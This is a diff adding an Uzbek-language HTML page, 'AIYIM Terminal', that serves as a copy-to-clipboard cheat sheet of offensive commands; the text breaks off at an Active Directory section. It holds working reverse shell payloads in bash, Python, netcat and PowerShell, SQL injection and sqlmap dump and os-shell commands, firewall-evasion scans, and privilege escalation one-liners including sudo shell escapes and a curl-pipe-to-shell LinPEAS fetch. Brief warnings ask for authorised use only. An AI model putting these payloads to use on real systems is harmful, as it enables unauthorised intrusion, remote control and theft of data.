@@ -1,0 +1,933 @@
+﻿<!DOCTYPE html>
+<html lang="uz">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AIYIM Terminal</title>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --green: #00ff41;
+      --green-dim: #00aa2b;
+      --green-dark: #003d10;
+      --bg: #050f05;
+      --bg2: #0a150a;
+      --border: rgba(0,255,65,0.18);
+      --red: #ff2424;
+      --yellow: #ffcc00;
+      --cyan: #00ffff;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: var(--bg); color: var(--green); font-family: 'JetBrains Mono', monospace; min-height: 100vh; overflow-x: hidden; }
+
+    /* Header */
+    .header {
+      background: rgba(0,255,65,0.05);
+      border-bottom: 1px solid var(--border);
+      padding: 12px 20px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+    .header-logo { font-family: 'Orbitron', monospace; font-size: 14px; color: var(--green); letter-spacing: 2px; }
+    .header-tool { font-size: 11px; color: var(--green-dim); }
+    .header-badge {
+      margin-left: auto;
+      background: rgba(0,255,65,0.1);
+      border: 1px solid var(--green-dim);
+      padding: 4px 12px;
+      border-radius: 3px;
+      font-size: 10px;
+      letter-spacing: 1px;
+      color: var(--green);
+    }
+    .back-btn {
+      background: none;
+      border: 1px solid var(--border);
+      color: var(--green-dim);
+      padding: 4px 12px;
+      border-radius: 3px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 10px;
+      cursor: pointer;
+      letter-spacing: 1px;
+    }
+    .back-btn:hover { border-color: var(--green); color: var(--green); }
+
+    /* Main layout */
+    .container { display: grid; grid-template-columns: 260px 1fr; min-height: calc(100vh - 53px); }
+
+    /* Sidebar */
+    .sidebar {
+      border-right: 1px solid var(--border);
+      padding: 16px;
+      background: rgba(0,20,0,0.4);
+    }
+    .sidebar-title { font-size: 10px; color: var(--green-dim); letter-spacing: 2px; margin-bottom: 12px; text-transform: uppercase; }
+    .tool-btn {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      width: 100%;
+      background: none;
+      border: 1px solid transparent;
+      color: var(--green-dim);
+      padding: 8px 10px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      text-align: left;
+      margin-bottom: 4px;
+      transition: all 0.2s;
+      letter-spacing: 0.5px;
+    }
+    .tool-btn:hover, .tool-btn.active { background: rgba(0,255,65,0.08); border-color: var(--green-dim); color: var(--green); }
+    .tool-btn .icon { font-size: 14px; }
+
+    .online-section { margin-top: 20px; }
+    .online-title { font-size: 10px; color: var(--green-dim); letter-spacing: 2px; margin-bottom: 10px; }
+    .online-link {
+      display: block;
+      padding: 7px 10px;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      color: var(--cyan);
+      text-decoration: none;
+      font-size: 10px;
+      margin-bottom: 5px;
+      transition: all 0.2s;
+      letter-spacing: 0.5px;
+    }
+    .online-link:hover { background: rgba(0,255,255,0.06); border-color: var(--cyan); }
+    .online-link .link-icon { margin-right: 6px; }
+
+    /* Terminal area */
+    .terminal-area { display: flex; flex-direction: column; }
+    .terminal-topbar {
+      background: rgba(0,20,0,0.8);
+      border-bottom: 1px solid var(--border);
+      padding: 8px 20px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .dot { width: 10px; height: 10px; border-radius: 50%; }
+    .dot.red { background: var(--red); }
+    .dot.yellow { background: var(--yellow); }
+    .dot.green { background: var(--green); box-shadow: 0 0 6px var(--green); }
+    .terminal-title { font-size: 11px; color: var(--green-dim); margin-left: 8px; letter-spacing: 1px; }
+
+    .terminal-content { flex: 1; padding: 20px; overflow-y: auto; }
+
+    /* Command blocks */
+    .cmd-group { margin-bottom: 24px; }
+    .cmd-group-title {
+      font-size: 11px;
+      color: var(--yellow);
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .cmd-group-title::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+
+    .cmd-block {
+      background: rgba(0,20,0,0.6);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      margin-bottom: 10px;
+      overflow: hidden;
+    }
+    .cmd-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 6px 12px;
+      background: rgba(0,255,65,0.04);
+      border-bottom: 1px solid var(--border);
+    }
+    .cmd-label { font-size: 10px; color: var(--green-dim); letter-spacing: 1px; }
+    .copy-btn {
+      background: rgba(0,255,65,0.1);
+      border: 1px solid var(--green-dim);
+      color: var(--green);
+      padding: 2px 10px;
+      border-radius: 3px;
+      font-size: 9px;
+      cursor: pointer;
+      font-family: 'JetBrains Mono', monospace;
+      letter-spacing: 1px;
+      transition: all 0.2s;
+    }
+    .copy-btn:hover { background: rgba(0,255,65,0.2); }
+    .copy-btn.copied { background: rgba(0,255,65,0.3); color: #fff; }
+
+    .cmd-code { padding: 12px; font-size: 12px; line-height: 1.7; white-space: pre-wrap; }
+    .cmd-code .prompt { color: var(--green); }
+    .cmd-code .flag { color: var(--cyan); }
+    .cmd-code .string { color: var(--yellow); }
+    .cmd-code .comment { color: var(--green-dim); opacity: 0.7; }
+
+    .info-box {
+      background: rgba(0,255,65,0.04);
+      border: 1px solid var(--border);
+      border-left: 3px solid var(--green);
+      border-radius: 4px;
+      padding: 12px;
+      margin-bottom: 16px;
+      font-size: 11px;
+      line-height: 1.7;
+      color: rgba(0,255,65,0.85);
+    }
+
+    .warning-box {
+      background: rgba(255,204,0,0.05);
+      border: 1px solid rgba(255,204,0,0.3);
+      border-left: 3px solid var(--yellow);
+      border-radius: 4px;
+      padding: 10px 12px;
+      font-size: 10px;
+      color: var(--yellow);
+      margin-bottom: 16px;
+    }
+
+    /* Interactive input */
+    .terminal-input-area {
+      border-top: 1px solid var(--border);
+      background: rgba(0,10,0,0.8);
+      padding: 12px 20px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .prompt-sign { color: var(--green); font-size: 13px; white-space: nowrap; }
+    .cmd-input {
+      flex: 1;
+      background: none;
+      border: none;
+      color: var(--green);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      outline: none;
+      caret-color: var(--green);
+    }
+    .cmd-input::placeholder { color: rgba(0,255,65,0.3); }
+    .run-btn {
+      background: rgba(0,255,65,0.1);
+      border: 1px solid var(--green-dim);
+      color: var(--green);
+      padding: 5px 14px;
+      border-radius: 3px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      cursor: pointer;
+      letter-spacing: 1px;
+    }
+    .run-btn:hover { background: rgba(0,255,65,0.2); }
+
+    /* Output area */
+    .output-area {
+      background: rgba(0,10,0,0.9);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 12px;
+      margin-top: 12px;
+      font-size: 11px;
+      line-height: 1.8;
+      min-height: 60px;
+      display: none;
+      white-space: pre-wrap;
+    }
+    .output-area.show { display: block; }
+
+    @media (max-width: 768px) {
+      .container { grid-template-columns: 1fr; }
+      .sidebar { border-right: none; border-bottom: 1px solid var(--border); }
+    }
+  </style>
+</head>
+<body>
+
+<div class="header">
+  <button class="back-btn" onclick="window.close()">тЖР YOPISH</button>
+  <div>
+    <div class="header-logo">тЪб AIYIM TERMINAL</div>
+    <div class="header-tool" id="headerToolName">// Tool yuklanyapti...</div>
+  </div>
+  <div class="header-badge">ONLINE TOOLS + COMMANDS</div>
+</div>
+
+<div class="container">
+  <div class="sidebar">
+    <div class="sidebar-title">// Toollar</div>
+    <button class="tool-btn" onclick="loadTool('nmap')"><span class="icon">ЁЯФН</span> Nmap Recon</button>
+    <button class="tool-btn" onclick="loadTool('sqli')"><span class="icon">ЁЯТЙ</span> SQL Injection</button>
+    <button class="tool-btn" onclick="loadTool('linprivesc')"><span class="icon">тмЖя╕П</span> Linux PrivEsc</button>
+    <button class="tool-btn" onclick="loadTool('winprivesc')"><span class="icon">ЁЯкЯ</span> Windows PrivEsc</button>
+    <button class="tool-btn" onclick="loadTool('ad')"><span class="icon">ЁЯПЫя╕П</span> AD Attacks</button>
+    <button class="tool-btn" onclick="loadTool('ssrf')"><span class="icon">ЁЯМР</span> SSRF Attack</button>
+    <button class="tool-btn" onclick="loadTool('evasion')"><span class="icon">ЁЯЫбя╕П</span> Evasion & Bypass</button>
+    <button class="tool-btn" onclick="loadTool('revshell')"><span class="icon">ЁЯРЪ</span> Reverse Shells</button>
+    <button class="tool-btn" onclick="loadTool('xss')"><span class="icon">тЪб</span> XSS Attacks</button>
+    <button class="tool-btn" onclick="loadTool('osint')"><span class="icon">ЁЯХ╡я╕П</span> OSINT Tools</button>
+    <button class="tool-btn" onclick="loadTool('hash')"><span class="icon">ЁЯФС</span> Hash Cracking</button>
+
+    <div class="online-section" id="onlineLinks">
+      <!-- Online links render here -->
+    </div>
+  </div>
+
+  <div class="terminal-area">
+    <div class="terminal-topbar">
+      <div class="dot red"></div>
+      <div class="dot yellow"></div>
+      <div class="dot green"></div>
+      <div class="terminal-title" id="terminalTitle">root@aiyim:~#</div>
+    </div>
+    <div class="terminal-content" id="terminalContent">
+      <div class="info-box">// Chap men├╝dan tool tanlang yoki URL parametridan yuklanmoqda...</div>
+    </div>
+    <div class="terminal-input-area">
+      <span class="prompt-sign">root@aiyim:~#</span>
+      <input type="text" class="cmd-input" id="cmdInput" placeholder="buyruq kiriting (masalan: nmap -sV target.com)..." autocomplete="off" spellcheck="false">
+      <button class="run-btn" onclick="runSimulated()">тЦ╢ RUN</button>
+    </div>
+    <div class="output-area" id="outputArea"></div>
+  </div>
+</div>
+
+<script>
+const TOOLS = {
+  nmap: {
+    name: 'Nmap тАФ Port Scanning & Recon',
+    title: 'root@kali:~# nmap',
+    onlineLinks: [
+      { name: 'ЁЯМР HackerTarget Nmap Scanner', url: 'https://hackertarget.com/nmap-online-port-scanner/' },
+      { name: 'ЁЯМР Pentest-Tools Nmap', url: 'https://pentest-tools.com/network-vulnerability-scanning/tcp-port-scanner-online-nmap' },
+      { name: 'ЁЯУЪ GTFOBins', url: 'https://gtfobins.github.io/' },
+      { name: 'ЁЯФН Shodan.io', url: 'https://www.shodan.io/' },
+    ],
+    content: `
+<div class="info-box">ЁЯФН <strong>Nmap</strong> тАФ eng kuchli port scanner va tarmoq razvedka vositasi. Quyida real pentestda ishlatiladigan buyruqlar keltirilgan.</div>
+<div class="warning-box">тЪая╕П Nmap faqat RUXSATingiz bor tarmoqlarda ishlating! Ruxsatsiz skanerlash noqonuniy.</div>
+
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯЪА Tez Recon</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">TOP 1000 PORT тАФ TEZKOR</span><button class="copy-btn" onclick="copyCmd(this, 'nmap -sS --min-rate=5000 -p- {TARGET}')">COPY</button></div>
+    <div class="cmd-code"><span class="comment"># Barcha portlarni tez skanerlash</span>
+<span class="prompt">$</span> nmap <span class="flag">-sS --min-rate=5000 -p-</span> <span class="string">{TARGET}</span></div>
+  </div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">TO'LIQ RECON (OS + Version + Scripts)</span><button class="copy-btn" onclick="copyCmd(this, 'nmap -sS -sV -sC -O -p- --min-rate=1000 -oA full_scan {TARGET}')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> nmap <span class="flag">-sS -sV -sC -O -p- --min-rate=1000 -oA full_scan</span> <span class="string">{TARGET}</span></div>
+  </div>
+</div>
+
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯФО NSE Scriptlar</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">ZAIFLIK SCAN</span><button class="copy-btn" onclick="copyCmd(this, 'nmap --script=vuln -p 80,443,445,22 {TARGET}')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> nmap <span class="flag">--script=vuln</span> <span class="flag">-p 80,443,445,22</span> <span class="string">{TARGET}</span></div>
+  </div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">SMB ZAIFLIKLAR</span><button class="copy-btn" onclick="copyCmd(this, 'nmap --script=smb-vuln* -p 445 {TARGET}')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> nmap <span class="flag">--script=smb-vuln*</span> <span class="flag">-p 445</span> <span class="string">{TARGET}</span></div>
+  </div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">HTTP ENUM</span><button class="copy-btn" onclick="copyCmd(this, 'nmap --script=http-enum,http-headers,http-methods -p 80,443,8080 {TARGET}')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> nmap <span class="flag">--script=http-enum,http-headers,http-methods</span> <span class="flag">-p 80,443,8080</span> <span class="string">{TARGET}</span></div>
+  </div>
+</div>
+
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯЫбя╕П Firewall Bypass</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">FRAGMENTATSIYA + DECOY</span><button class="copy-btn" onclick="copyCmd(this, 'nmap -f -D RND:10 --source-port 53 {TARGET}')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> nmap <span class="flag">-f -D RND:10 --source-port 53</span> <span class="string">{TARGET}</span>
+<span class="comment"># -f: fragmentatsiya, -D: decoy IP lar, --source-port: port 53 (DNS)</span></div>
+  </div>
+</div>
+
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯМР Tarmoq Discovery</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">LIVE HOSTLAR TOPISH</span><button class="copy-btn" onclick="copyCmd(this, 'nmap -sn 192.168.1.0/24')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> nmap <span class="flag">-sn</span> <span class="string">192.168.1.0/24</span>
+<span class="comment"># Butun subnet da jonli hostlarni topish</span></div>
+  </div>
+</div>`
+  },
+
+  sqli: {
+    name: 'SQL Injection Testing',
+    title: 'root@kali:~# sqlmap',
+    onlineLinks: [
+      { name: 'ЁЯМР SQLMap Online Tester', url: 'https://suip.biz/?act=sqlmap' },
+      { name: 'ЁЯМР HackerTarget SQLi Scanner', url: 'https://hackertarget.com/sql-injection-vulnerability-detection/' },
+      { name: 'ЁЯУЪ PortSwigger SQLi Labs', url: 'https://portswigger.net/web-security/sql-injection' },
+      { name: 'ЁЯОп DVWA Practice', url: 'http://www.dvwa.co.uk/' },
+    ],
+    content: `
+<div class="info-box">ЁЯТЙ <strong>SQL Injection</strong> тАФ ma'lumotlar bazasiga ruxsatsiz kirishga imkon beruvchi zaiflik. OWASP Top 10 da A03 o'rinda.</div>
+<div class="warning-box">тЪая╕П Faqat ruxsatingiz bor tizimlarni test qiling!</div>
+
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯФН Manual Test Payloads</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">ASOSIY TEST PAYLOADS</span><button class="copy-btn" onclick="copyCmd(this, \'\\' OR 1=1--\\n\\' OR \\'1\\'=\\'1\\n\\" OR 1=1--\\n1\\' ORDER BY 1--\\n1\\' UNION SELECT NULL--\')">COPY</button></div>
+    <div class="cmd-code"><span class="string">' OR 1=1--</span>
+<span class="string">' OR '1'='1</span>
+<span class="string">" OR 1=1--</span>
+<span class="string">1' ORDER BY 1--</span>
+<span class="string">1' UNION SELECT NULL--</span></div>
+  </div>
+</div>
+
+<div class="cmd-group">
+  <div class="cmd-group-title">тЪб SQLMap Avtomatik</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">ASOSIY SCAN</span><button class="copy-btn" onclick="copyCmd(this, 'sqlmap -u \"http://target.com/page?id=1\" --dbs')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> sqlmap <span class="flag">-u</span> <span class="string">"http://target.com/page?id=1"</span> <span class="flag">--dbs</span></div>
+  </div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">MA'LUMOT OLISH</span><button class="copy-btn" onclick="copyCmd(this, 'sqlmap -u \"http://target.com/page?id=1\" -D dbname -T users --dump')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> sqlmap <span class="flag">-u</span> <span class="string">"http://target.com/page?id=1"</span> <span class="flag">-D</span> <span class="string">dbname</span> <span class="flag">-T users --dump</span></div>
+  </div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">WAF BYPASS + OS SHELL</span><button class="copy-btn" onclick="copyCmd(this, 'sqlmap -u \"http://target.com/page?id=1\" --tamper=space2comment --os-shell')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> sqlmap <span class="flag">--tamper=space2comment --os-shell</span> <span class="flag">-u</span> <span class="string">"http://target.com/page?id=1"</span></div>
+  </div>
+</div>
+
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯХ╡я╕П UNION-Based Manual</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">DATABASE OLISH</span><button class="copy-btn" onclick="copyCmd(this, \"' UNION SELECT database(),2,3-- -\")">COPY</button></div>
+    <div class="cmd-code"><span class="string">' UNION SELECT database(),2,3-- -</span>
+<span class="string">' UNION SELECT table_name,2,3 FROM information_schema.tables-- -</span>
+<span class="string">' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -</span>
+<span class="string">' UNION SELECT username,password,3 FROM users-- -</span></div>
+  </div>
+</div>`
+  },
+
+  revshell: {
+    name: 'Reverse Shell Generator',
+    title: 'root@kali:~# nc -lvnp 4444',
+    onlineLinks: [
+      { name: 'ЁЯМР RevShells.com (Avtomatik)', url: 'https://www.revshells.com/' },
+      { name: 'ЁЯМР PayloadsAllTheThings', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md' },
+      { name: 'ЁЯУЪ GTFOBins', url: 'https://gtfobins.github.io/' },
+      { name: 'ЁЯЫая╕П Shell Upgrader', url: 'https://www.revshells.com/#upgrading' },
+    ],
+    content: `
+<div class="info-box">ЁЯРЪ <strong>Reverse Shell</strong> тАФ maqsad tizimi sizga ulanadi. Avval listener oching, keyin payload yuboring.</div>
+
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯСВ Listener (Birinchi bu!)</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">NETCAT LISTENER</span><button class="copy-btn" onclick="copyCmd(this, 'rlwrap nc -lvnp 4444')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> rlwrap nc <span class="flag">-lvnp</span> <span class="string">4444</span>
+<span class="comment"># rlwrap: yuqori/pastga navigatsiya uchun</span></div>
+  </div>
+</div>
+
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯРз Linux Payloads</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">BASH</span><button class="copy-btn" onclick="copyCmd(this, 'bash -i >& /dev/tcp/IP/4444 0>&1')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> bash <span class="flag">-i</span> <span class="string">>& /dev/tcp/IP/4444 0>&1</span></div>
+  </div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">PYTHON3</span><button class="copy-btn" onclick="copyCmd(this, 'python3 -c \\'import socket,subprocess,os;s=socket.socket();s.connect((\"IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])\\'')">COPY</button></div>
+    <div class="cmd-code"><span class="string">python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</span></div>
+  </div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">NETCAT (mkfifo)</span><button class="copy-btn" onclick="copyCmd(this, 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444 >/tmp/f')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i <span class="flag">2>&1</span>|nc <span class="string">IP 4444</span> >/tmp/f</div>
+  </div>
+</div>
+
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯкЯ Windows Payloads</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">POWERSHELL</span><button class="copy-btn" onclick="copyCmd(this, 'powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient(\\'IP\\',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}\"')">COPY</button></div>
+    <div class="cmd-code"><span class="string">powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('IP',4444);...</span>
+<span class="comment"># To'liq kod uchun yuqoridagi COPY tugmasini bosing</span></div>
+  </div>
+</div>
+
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯФз Shell Upgrade (PTY)</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">FULL INTERACTIVE SHELL</span><button class="copy-btn" onclick="copyCmd(this, 'python3 -c \\'import pty;pty.spawn(\"/bin/bash\")\\'\n# Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm COLUMNS=200 ROWS=50')">COPY</button></div>
+    <div class="cmd-code"><span class="string">python3 -c 'import pty;pty.spawn("/bin/bash")'</span>
+<span class="comment"># Ctrl+Z bosing, keyin:</span>
+<span class="prompt">$</span> stty raw -echo; fg
+<span class="prompt">$</span> export TERM=xterm COLUMNS=200 ROWS=50</div>
+  </div>
+</div>`
+  },
+
+  linprivesc: {
+    name: 'Linux Privilege Escalation',
+    title: 'root@kali:~# linpeas.sh',
+    onlineLinks: [
+      { name: 'ЁЯМР GTFOBins (SUID exploits)', url: 'https://gtfobins.github.io/' },
+      { name: 'ЁЯУе LinPEAS Download', url: 'https://github.com/carlospolop/PEASS-ng/releases/latest' },
+      { name: 'ЁЯУЪ HackTricks Linux PrivEsc', url: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation' },
+      { name: 'ЁЯФН Linux Exploit Suggester', url: 'https://github.com/mzet-/linux-exploit-suggester' },
+    ],
+    content: `
+<div class="info-box">тмЖя╕П <strong>Linux PrivEsc</strong> тАФ oddiy foydalanuvchidan root ga ko'tarilish. Avval ma'lumot to'plan, keyin vektor toping.</div>
+
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯУК Ma'lumot Yig'ish</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">TEZKOR RECON</span><button class="copy-btn" onclick="copyCmd(this, 'id && uname -a && cat /etc/os-release && cat /etc/passwd | grep -v nologin')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> id && uname -a && cat /etc/os-release
+<span class="prompt">$</span> cat /etc/passwd | grep -v nologin</div>
+  </div>
+</div>
+
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯФР SUDO</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">SUDO TEKSHIRISH</span><button class="copy-btn" onclick="copyCmd(this, 'sudo -l')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> sudo -l
+<span class="comment"># Natijaga qarab GTFOBins.io dan exploit toping</span></div>
+  </div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">SUDO BYPASS (MASHHUR)</span><button class="copy-btn" onclick="copyCmd(this, 'sudo vim -c \":!/bin/sh\"\nsudo python3 -c \"import os; os.system(\\'/bin/sh\\')\"\nsudo find / -exec /bin/sh \\\\; 2>/dev/null\nsudo awk \\'BEGIN {system(\"/bin/sh\")}\\'\nsudo env /bin/sh')">COPY</button></div>
+    <div class="cmd-code"><span class="string">sudo vim</span> <span class="flag">-c</span> <span class="string">':!/bin/sh'</span>
+<span class="string">sudo python3</span> <span class="flag">-c</span> <span class="string">'import os; os.system("/bin/sh")'</span>
+<span class="string">sudo find / -exec /bin/sh \\; 2>/dev/null</span>
+<span class="string">sudo awk 'BEGIN {system("/bin/sh")}'</span></div>
+  </div>
+</div>
+
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯФС SUID</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">SUID TOPISH</span><button class="copy-btn" onclick="copyCmd(this, 'find / -perm -4000 -type f 2>/dev/null')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> find / <span class="flag">-perm -4000 -type f</span> <span class="string">2>/dev/null</span>
+<span class="comment"># Topilganlarni gtfobins.github.io da qidiring</span></div>
+  </div>
+</div>
+
+<div class="cmd-group">
+  <div class="cmd-group-title">тП░ Cron Jobs</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">CRON TEKSHIRISH</span><button class="copy-btn" onclick="copyCmd(this, 'crontab -l\ncat /etc/crontab\nls -la /etc/cron.*\nfind / -name \"*.sh\" -writable 2>/dev/null')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> crontab -l && cat /etc/crontab
+<span class="prompt">$</span> find / <span class="flag">-name "*.sh" -writable</span> 2>/dev/null</div>
+  </div>
+</div>
+
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯЪА LinPEAS (Avtomatik)</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">LINPEAS YUKLASH VA ISHLATISH</span><button class="copy-btn" onclick="copyCmd(this, 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null | tee /tmp/lp.txt')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> curl <span class="flag">-L</span> <span class="string">https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</span> | sh</div>
+  </div>
+</div>`
+  },
+
+  winprivesc: {
+    name: 'Windows Privilege Escalation',
+    title: 'C:\\> winpeas.exe',
+    onlineLinks: [
+      { name: 'ЁЯМР LOLBAS (Living Off The Land)', url: 'https://lolbas-project.github.io/' },
+      { name: 'ЁЯУе WinPEAS Download', url: 'https://github.com/carlospolop/PEASS-ng/releases/latest' },
+      { name: 'ЁЯУЪ HackTricks Win PrivEsc', url: 'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation' },
+      { name: 'ЁЯФН Potato Attacks', url: 'https://jlajara.gitlab.io/Potatoes_Windows_Privesc' },
+    ],
+    content: `
+<div class="info-box">ЁЯкЯ <strong>Windows PrivEsc</strong> тАФ standart user dan SYSTEM/Administrator ga ko'tarilish usullari.</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯУК Ma'lumot Yig'ish</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">IMTIYOZLAR TEKSHIRISH</span><button class="copy-btn" onclick="copyCmd(this, 'whoami /all\nwhoami /priv\nsysteminfo\nnet user\nnet localgroup administrators')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">C:\\></span> whoami /all
+<span class="prompt">C:\\></span> whoami /priv
+<span class="prompt">C:\\></span> systeminfo</div>
+  </div>
+</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯеФ Token Impersonation (Potato)</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">JUICYPOTATO / PRINTSPOOFER</span><button class="copy-btn" onclick="copyCmd(this, 'whoami /priv\n# SeImpersonatePrivilege bo\\'lsa:\nPrintSpoofer.exe -i -c cmd\nGodPotato.exe -cmd \"cmd /c whoami\"')">COPY</button></div>
+    <div class="cmd-code"><span class="comment"># SeImpersonatePrivilege bo'lsa:</span>
+<span class="prompt">C:\\></span> PrintSpoofer.exe <span class="flag">-i -c</span> cmd
+<span class="prompt">C:\\></span> GodPotato.exe <span class="flag">-cmd</span> <span class="string">"cmd /c whoami"</span></div>
+  </div>
+</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯУБ AlwaysInstallElevated</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">REGISTRY TEKSHIRISH</span><button class="copy-btn" onclick="copyCmd(this, 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">C:\\></span> reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+<span class="comment"># Ikkalasi 0x1 bo'lsa тАФ exploit mumkin!</span></div>
+  </div>
+</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯЪА WinPEAS</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">WINPEAS ISHLATISH</span><button class="copy-btn" onclick="copyCmd(this, '.\\winpeas.exe > C:\\Temp\\output.txt\ntype C:\\Temp\\output.txt | findstr /i \"interesting\"')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">C:\\></span> .\\winpeas.exe
+<span class="comment"># Qizil/sariq natijalarni tekshiring</span></div>
+  </div>
+</div>`
+  },
+
+  ad: {
+    name: 'Active Directory Attacks',
+    title: 'root@kali:~# bloodhound',
+    onlineLinks: [
